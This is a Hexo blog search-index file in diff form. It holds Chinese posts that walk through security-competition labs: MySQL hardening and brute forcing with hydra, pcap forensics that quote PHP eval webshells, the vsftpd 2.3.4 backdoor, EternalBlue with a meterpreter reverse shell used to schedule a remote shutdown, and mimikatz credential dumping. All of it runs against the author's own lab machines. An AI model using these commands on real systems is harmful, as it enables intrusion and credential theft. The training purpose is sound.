+      <link href="2021/04/14/%E4%B8%80%E5%AE%9A%E8%A6%81%E8%AF%BB%E7%9A%84%E6%96%87%E7%AB%A0/"/>
+      <url>2021/04/14/%E4%B8%80%E5%AE%9A%E8%A6%81%E8%AF%BB%E7%9A%84%E6%96%87%E7%AB%A0/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>看到文章的大哥大姐们<br>一人qq发我一句土味情话呗<br>谢谢大哥大姐姐们<br>讲给我媳妇听 哄她开心<br><img src="1.png"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>数据库安全加固</title>
+      <link href="2021/04/14/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
+      <url>2021/04/14/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>写这篇文章的时候想到了一个兄弟,他喜欢一个女孩,本来聊的挺不错的，到后来女孩还是说了句”各自安好”</strong><br><strong>我只是想说 兄弟,喜欢就去追，追不上就适当的放手,你很优秀,你前途一片光芒,既然不追了就放过自己,别太累,请记住生活再难也得过,你还仅仅是个孩子</strong></p><p><strong>此文章照片有改动</strong></p><p><strong>数据库安全加固</strong></p><p><strong>服务器场景：CentOS6.8（用户名：root；密码：123456）</strong></p><p><strong>服务器场景操作系统：CentOS6.8</strong></p><p><strong>1.进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码： root），查看数据库版本号，将查看数据库版本号的命令作为<br>flag 提交；</strong><br><strong>进入mysql数据库    输入select version();  查看数据库版本   flag:select version();</strong><br><img src="1.png"></p><p><strong>2.进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码： root），查看数据库版本号，将查询到的数据库版本号作为<br>flag 提交；</strong><br><strong>输入上面的命令  就出答案了     flag:5.0.51a-3ubuntu5</strong><br><img src="2.png"></p><p><strong>3.进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码： root），查看数据库列表，将查看数据库列表的命令作为</strong><br><strong>flag 提交</strong>；<br><strong>输入 show databases;    flag:show databases;</strong><br><img src="3.png"></p><p><strong>4.进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码： root），进入 mysql 数据库，查看所有用户及权限，</strong><br><strong>找到可以从任意 IP 地址访 问的用户，将该用户的用户名作为 flag 提交；（如有多个可以从任意 IP 地址访 问的用户，提交形式</strong><br><strong>为用户名|用户名|用户名|用户名）</strong><br><strong>输入show tables;查看数据库中的表</strong><br><img src="4.png"><br><strong>输入 select user,host from user where host=’%’;    flag:root       #因为这是我自己的靶机,所以没有那么多用户</strong><br><img src="5.png"><br><strong>5.进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码： root），进入 mysql 数据库，查看所有用户及权限，</strong><br><strong>找到可以从任意 IP 地址访 问的用户，使用 drop 命令将该用户删除，将操作命令作为 flag 提交。</strong><br><strong>接着上题  查看到了用户及其权限</strong><br><strong>使用drop user ‘root’@’%’;     #删除root用户      删除root用户时要清楚   删除了就登陆不上去了 我这里新建了一个用户</strong><br><img src="6.png"><br><strong>select user,password,host from user;   查看一下是否还有root用户     flag:drop user ‘root’@’%’;</strong><br>       <img src="7.png"><br><strong>6.进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码： root），进入 mysql 数据库，改变默认 mysql 管理员的</strong><br><strong>名称，将系统的默认管理员 root 改为 admin，防止被列举，将操作命令作为 flag 提交。</strong><br><strong>为了做题我又新建了一个root用户</strong><br><img src="8.png"><br><strong>输入update user set user=’admin’ where user=’root’;  进行修改</strong><br><strong>flag:update user set user=’admin’ where user=’root’;</strong><br><img src="9.png"><br><strong>然后在select user,password,host from user;    查看一下是否更改成功</strong><br><strong>看到root的地方变为admin    更改成功</strong><br><img src="10.png"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>中职网络安全 MYSQL信息收集</title>
+      <link href="2021/04/14/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-MYSQL%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+      <url>2021/04/14/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-MYSQL%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>我没有原靶机和原资料  答案和题目的答案有很大不同  只可以当做一个参考</strong><br><strong>MYSQL信息收集</strong></p><p><strong>服务器场景名称:MySql03</strong></p><p><strong>服务器场景操作系统:Microsoft Windows2003 Server</strong></p><p><strong>服务器场景用户名:admin   密码:未知</strong></p><p><strong>渗透机场景:kali</strong></p><p><strong>渗透机用户名:root 密码:toor</strong></p><p><strong>1.通过PC（虚拟机：Kali）中渗透测试工具对服务器场景MySql03进行服务信息扫描渗透测试（使用工具nmap，使用必须要使用的参数）， 并将该操作显示结果中数据库版本信息作为flag提交；</strong><br><strong>输入nmap -sV -p3306 192.168.32.131            #192.168.32.131  为我靶机的ip</strong><br><img src="1.png"></p><p><strong>2.通过PC（虚拟机：Kali）中渗透测试工具对服务器场景MySQL03的数据库进行暴力破解，并将数据库的密码作为flag提交；（字典/root/mysql03）</strong><br><strong>没有原资料跟原靶机  只能自己动手  自己动手丰衣足食</strong><br><strong>输入  hydra -l root -P 8.txt -t 5 -V 192.168.32.131 mysql</strong><br><strong>-l 是用户的意思</strong><br><strong>-P 是密码字典的意思</strong><br><strong>-t 是速度的意思</strong><br><strong>-V 是将破解的过程显示出来</strong><br><strong>8.txt 是我自己写的字典</strong><br><img src="2.png"></p><p><strong>爆破出密码为123456</strong></p><p><strong>3.通过PC（虚拟机：Kali）中对服务器场景MySql03的数据库进行远程连接，并将数据库中库的数量作为flag提交;</strong><br><strong>输入mysql -h 192.168.32.131 -uroot -p123456  进行远程连接数据库</strong><br><img src="3.png"><br><strong>输入show databases;   查看数据库列表</strong><br><strong>flag:7</strong><br><img src="4.png"><br><strong>4.通过PC（虚拟机：Kali）中对服务器场景MySql03的数据库进行状态查询，并将数据库状态中的版本作为flag提交;</strong><br><strong>输入select version();     查看数据库的版本</strong><br><strong>flag:5.0.51a-3ubuntu5</strong><br><img src="5.png"><br><strong>5.通过PC（虚拟机：Kali）对服务器场景MySql03中数据库进行查询当前使用的数据库，并将数据库名称作为flag提交；</strong><br><strong>输入select database;   查询数据库</strong><br><strong>flag:  mysql</strong><br><img src="6.png"><br><strong>6.通过PC（虚拟机：Kali）对服务器场景MySql03中数据库进行数据库的所有用户信息查询，并将倒数第二个用户名作为flag提交；</strong><br><strong>输入select user,host,password from user;</strong><br><strong>flag:root</strong><br><img src="7.png"></p><p><strong>7.通过PC（虚拟机：Kali）对服务器场景MySql03中数据库进行数据文件存放路径查询，并将存放路径作为flag提交；</strong><br><strong>输入show variadbles like ‘%datadir%’;  查看文件存放路径</strong>     <strong>路径为/var/lib/mysql/</strong><br><img src="8.png"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>中职网络安全 数据包分析capture3.pcap</title>
+      <link href="2021/04/14/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90capture3-pcap/"/>
+      <url>2021/04/14/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90capture3-pcap/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>任务环境说明:<br> 服务器场景:PYsystem20191<br> 服务器场景操作系统:windows(版本不详)</p><p><strong>1.使用Wireshark查看并分析PYsystem20191桌面下的capture3.pcap数据包文件，找出黑客登录被攻击服务器网站后台使用的账号密码，并将黑客使用的账号密码作为Flag值（用户名与密码之间以英文逗号分隔，例如：root,toor）提交；（9分)</strong></p><p><strong>过滤http   用户为admin  密码为<a href="http://www.1d80.cn/">www.1d80.cn</a></strong><br><img src="1.png"><br><img src="2.png"></p><p><strong>2.继续分析数据包capture3.pcap，找出黑客攻击FTP服务器后获取到的三个文件，并将获取到的三个文件名称作为Flag值（提交时按照文件下载的时间的先后顺序排序，使用/分隔，例如：a/b/c）提交;</strong><br><strong>过滤ftp-data   追踪tcp流    得出三个文件   aliyunPassword.txt  LDWpassword.txt  py-jiaoyi.txt</strong><br><img src="3.png"><br><img src="4.png"><br><img src="5.png"><br><strong>3.继续分析数据包capture3.pcap，找出黑客登录服务器后台上传的一句话木马，并将上传的一句话木马的文件名称作为Flag值（例如：muma）提交；（13分)</strong><br><strong>过滤http    找到POST /InsertFileInfo.php HTTP/1.1 下面的就是   得到一句话木马文件名为 trojan.php</strong><br><img src="6.png"><br><img src="7.png"><br><strong>4.继续分析数据包capture3.pcap，找出黑客上传的一句话木马的连接密码，并将一句话木马的连接密码作为Flag值（例如：abc123）提交；（13分)</strong><br><strong>过滤http 往下找到最后一个进行POST登陆的网址</strong><br><img src="8.png"><br><strong>一句话木马为   “@eval(base64_decode($_POST[action]));”     密码为Cknife</strong><br><img src="9.png"><br><strong>5.继续分析数据包capture3.pcap，找出黑客上传一句话木马后下载的服务器关键文件，并将下载的关键文件名称作为Flag值提交；</strong><br><strong>接着上一题的页面  复制z1 的 Value后面的  进行base64 -d 解密    得到C:\spirit-shield_net.txt</strong><br><img src="10.png"><br><img src="11.png"><br><strong>6.继续分析数据包capture3.pcap，找出黑客第二次上传的木马文件，并将该木马文件的连接密码作为Flag值（例如：abc123）提交；（11分)</strong><br><strong>导出http  往下找 找到GET的信息    pwd后面的就是密码</strong><br><img src="12.png"></p><p><strong>7.继续分析数据包capture3.pcap，找出黑客通过木马使用的第一条命令，并将该命令作为Flag值提交；（9分）</strong><br><strong>找到这一条信息   cmd后面的复制下来  进行base64 -d 进行解密  得到命令为netstat -ano</strong><br><img src="13.png"><br><img src="14.png"><br><img src="15.png"></p><p><strong>8.继续分析数据包capture3.pcap，找出黑客控制了受害服务器后通过受害服务器向自己发送了多少次ICMP请求，并将请求的次数作为Flag值提交。（13分)</strong><br><strong>过滤icmp and ip.dst==192.168.13.129</strong><br><img src="16.png"><br><strong>数了一下 为20个</strong></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>kali安装tools</title>
+      <link href="2021/04/13/kali%E5%AE%89%E8%A3%85tools/"/>
+      <url>2021/04/13/kali%E5%AE%89%E8%A3%85tools/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>1.点击左上角的虚拟机 , 往下找到管理 ,管理下面有个安装Vmware Tools         点击就行</strong><br><img src="1.png"></p><p><strong>2.点击之后  在kali里面会出来VMware Tools</strong><br><img src="2.png"></p><p><strong>3.将VMwareTools-10.3.22-15902021.tar.gz 复制到一个地方      我这里是复制到主目录下</strong><br><img src="3.png"></p><p><strong>4.打开终端 , 输入ls    查看一下文件</strong><br><strong>然后tar -zxvf VMwareTools-10.3.22-15902021.tar.gz</strong><br><strong>进行解压</strong><br><img src="4.png"><br><strong>5.解压完  ls 查看一下     解压出来了vmware-tools-distrib</strong><br><img src="5.png"></p><p><strong>6.输入 cd vmware-tools-distrib  进入到vmware-tools-distrib</strong><br><img src="6.png"></p><p><strong>7. 进入之后ls 查看一下  看到了vmware-install.pl</strong></p><p><img src="7.png"></p><p><strong>8.输入 ./vmware-install.pl</strong><br><img src="8.png"></p><p><strong>然后一路回车</strong><br><strong>出现Engoy表示安装成功</strong><br><img src="9.png"></p><p><strong>然后reboot 重启 一下就好了</strong></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>linux笑脸漏洞</title>
+      <link href="2021/04/13/linux%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/"/>
+      <url>2021/04/13/linux%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>  要靶机的可以加我QQ，qq号在我主页有   备注来由<br><strong>渗透机为:kali</strong><br><strong>靶机为:metasploitable-Linux</strong><br><strong>kali攻击linux</strong><br><strong>1.首先nmap 扫描一下开放的端口</strong></p><p><strong>如图可以看出开放21端口和22端口等等一些端口</strong></p><p><strong>21端口版本为vsftpd 2.3.4</strong> </p><p><img src="1.png"></p><p><strong>2.利用笑脸漏洞对linux进行攻击</strong><br><strong>msfconsole 启动metasploit</strong><br><img src="2.png"><br><strong>3.搜索vsftpd的模块</strong></p><p><strong>search vsftpd</strong><br><img src="3.png"></p><p>4.<br><strong>use exploit/unix/ftp/vsftpd_234_backdoor</strong>   #进行利用模块<br><img src="4.png"></p><p><strong>5.show options    查看一下需要配置的</strong><br><img src="5.png">                           #我这里已经配置好ip了</p><p><strong>6.进行攻击  run</strong><br><img src="6.png"><br>7.修改一下密码<br><strong>passwd root</strong><br><strong>Enter new UNIX password: 123456            #输入新的密码     123456</strong><br><strong>Retype new UNIX password: 123456           #重新输入新的密码  123456</strong><br><strong>passwd: password updated successfully      #设置成功</strong></p><p><img src="7.png"></p><p><strong>8.重新开一个终端 进行ssh匿名连接</strong><br><strong>ssh 192.168.32.131                  #192.168.32.131为靶机的ip</strong><br><strong>第一次输入之后会回单出一个对话框   输入yes  就行</strong><br><strong>然后 在  <a href="mailto:&#x72;&#111;&#x6f;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#51;&#x32;&#46;&#49;&#x33;&#49;">&#x72;&#111;&#x6f;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#51;&#x32;&#46;&#49;&#x33;&#49;</a>‘s password:    输入123456     进行连接</strong><br><img src="8.png"></p><p><strong>连接上去也就攻击进去了</strong>   </p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>中职网络空间安全 数据分析-A</title>
+      <link href="2021/04/13/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-A/"/>
+      <url>2021/04/13/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-A/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>想要数据包的话可以加我QQ,QQ号在主页下面是有的</strong><br><strong>数据分析-A</strong><br>渗透机场景:windows 7<br>渗透机用户名:adminintrator 密码:123456</p><p>1.通过分析windows7桌面上的数据包A.pcapng，找到黑客连接一句话木马的密码,将该密码作为FLAG提交;<br>过滤http,往下找到含有两个POST请求并列的就是 点击进去一句话木马为  <strong>Form item: “oo” = “@eval(base64_decode($_POST[z0]));”</strong><br><strong>00 为密码</strong><br><img src="1.png">  </p><p>2.通过分析数据包A.pcapng，找到黑客扫描的网段范围是多少（IP之间用”,”隔开，例：192.168.1.1-192.168.1.2）将该范围作为FLAG提交；<br><strong>接着上面一题 往下找到    Form item: “z2” = “Y2QgL2QgIkM6XHBocFN0dWR5XFdXV1wiJnN0YXJ0IC9iIHB5dGhvbiBSQVNzY2FuLnB5IDE5Mi4xNjguMTAuMTAgMTkyLjE2OC4xMC4zMCAtdCAyMCZlY2hvIFtTXSZjZCZlY2hvIFtFXQ==”</strong><br><img src="2.png"><br><strong>把Value后面的复制下来</strong><br><img src="3.png"><br><strong>到终端利用base64 -d 解密方法   进行解密</strong><br><img src="4.png"><br>3.通过分析数据包A.pcapng，找到域服务器的密码是多少，将该密码作为FLAG提交;<br><strong>导出http文件</strong><br><img src="5.png"><br><img src="6.png"><br><strong>随便选择一个文件导入进去即可</strong><br><img src="7.png"><br><strong>点开导入的文件夹进去找</strong><br><strong>找到了aaaa(34).php这个文件</strong><br><img src="8.png"><br><strong>密码为163.com</strong><br>4.通过分析数据包A.pcapng，找到服务器安装的第一个修补程序，将该修补程序的名称作为FLAG提交;<br><strong>接着上一题  找到了aaaa(11).php文件  修补程序就在  将第一个修补的程序名称提交就行  KB2534111</strong><br><img src="9.png"></p><p>5.通过分析数据包A.pcapng，找到黑客下载的文件是什么，将该文件内容作为FLAG提交；<br><strong>在kali中  找到binwalk这个工具    使用命令</strong><br><strong>binwalk -e 后面加数据包的名称</strong>    <strong>#找到数据包A.pcapng的位置    将数据包拖到终端</strong><br><img src="10.png"><br><strong>完成之后会在你数据包的目录下生成一个 A.pcapng.extracted的文件夹</strong><br><img src="11.png"><br><img src="12.png"><br><strong>没想到的是flag.zip需要密码</strong><br><img src="13.png"><br><strong>找到了一些信息</strong><br><strong>前四位密码是DBOQ，后四位是随机组成的数字</strong><br><img src="14.png"><br><strong>利用kali的工具 crunch 生成字典</strong><br><strong>crunch 8 8 -t DBOQ%%%% &gt;&gt;3.txt      #8 8 的意思是8位 -t的意思是指定什么模式 %%%%为数字 &gt;&gt;3.txt放到3.txt文件里面</strong><br><img src="15.png"><br><img src="16.png"><br><strong>然后利用fcrackzip这个工具   #我的2019年的kali上面是没有的 我又从新下载的</strong><br><img src="17.png"><br><strong>-D的意思是要使用字典破解</strong><br><strong>-p的意思是表示要使用那个字典破解</strong><br><strong>5.txt为字典</strong><br><strong>-u的意思是指定爆破的压缩包</strong><br><strong>得到密码为DBOQ6457</strong><br><strong>输入进入   得到flag{friday}</strong><br><img src="18.png"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>渗透进入win7,利用mimikatz破解密码</title>
+      <link href="2021/04/12/%E6%B8%97%E9%80%8F%E8%BF%9B%E5%85%A5win7-%E5%88%A9%E7%94%A8mimikatz%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/"/>
+      <url>2021/04/12/%E6%B8%97%E9%80%8F%E8%BF%9B%E5%85%A5win7-%E5%88%A9%E7%94%A8mimikatz%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>接着上一篇文章</strong></p><p><strong>1.msf渗透进入win7之后 反弹会来了   meterpreter</strong></p><p><strong>在对话框中输入 getiud 启动这个模块</strong></p><p><strong>2.load mimikatz   加载一下mimikatz框架</strong></p><p><strong>3.msv 查看一下用户信息和加密密码</strong></p><p><strong>4.wdigest      破解加密密码  破解出Administrator用户的密码为123456</strong><br><img src="1.png"><br><strong>5.获取密码为123456 输入run getgui -e 启动远程连接</strong><br><img src="2.png"><br><strong>6.另开一个终端窗口   输入rdektop 192.168.32.132   #192.168.32.132是我win7的ip</strong><br><img src="3.png"><br><strong>7.回车之后就为这样</strong><br><img src="4.png"><br><strong>8.输入用户名和密码  登陆进去</strong><br><img src="5.png"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>渗透win7实施关机命令</title>
+      <link href="2021/04/12/%E6%B8%97%E9%80%8Fwin7%E5%AE%9E%E6%96%BD%E5%85%B3%E6%9C%BA%E5%91%BD%E4%BB%A4/"/>
+      <url>2021/04/12/%E6%B8%97%E9%80%8Fwin7%E5%AE%9E%E6%96%BD%E5%85%B3%E6%9C%BA%E5%91%BD%E4%BB%A4/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>需要关闭防火墙和杀毒软件  需要ping通</strong><br><img src="2.png"><br><strong>1.首先用nmap对靶机进行扫描,确定445端口是否开启</strong><br><img src="1.png"></p><p><strong>2.启动msfconsol</strong><br><img src="3.png"><br><strong>3.搜索模块  search ms17_010</strong><br><img src="4.png"><br><strong>4.利用exploit/windows/smb/ms17_010_eternalblue模块</strong><br>     <strong>use exploit/windows/smb/ms17_010_eternalblue</strong><br><img src="5.png"><br><strong>5.查看需要设置的命令    show options</strong><br><img src="6.png"><br><strong>6. (1).设置set rhosts   #设置靶机ip</strong><br>   <strong>(2).反弹效应  set payload windows/x64/meterpreter/reverse_tcp</strong><br>   <strong>(3).set lhost   #设置反弹回来的ip  也就是反弹到kali的ip</strong><br><img src="7.png"><br>   <img src="8.png"><br>   <img src="9.png">    <strong>#192.168.32.135是我kali的ip</strong><br><strong>7.run或者exploit     进行渗透</strong><br><img src="10.png"><br><strong>8.反弹会meterpreter的回话</strong><br><img src="11.png"><br><strong>9.输入shell     #进入c:\windows\system32下</strong><br><img src="12.png"><br><strong>10. 会含有乱码的现象,输入 chcp 65001   调解乱码</strong></p><p>*<em>11.为了方便在c盘的根目录下  c:*</em><br><strong>写入 echo shutdown -s -t 1 &gt;1.bat    #在c盘根目录下生成1.bat文件</strong><br><img src="13.png"><br><strong>12.net time \192.168.32.132      #192.168.32.132是win7的ip   意思是查看192.168.32.132里面的时间</strong><br><img src="14.png"><br><strong>13.at \192.168.32.132 12:12 “c:\1.bat”   #设置16:9时间  执行c盘下的1.bat文件</strong><br><img src="15.png"><br><strong>设置完成之后  静等时间到来</strong><br><img src="16.png" alt="_********_"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="2021/03/16/%E5%97%A8/"/>
+      <url>2021/03/16/%E5%97%A8/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><p>初来</p><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><p>我很菜</p><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><p>除了菜一无所有</p><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><p>不对，还有个对象</p><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
+</search>
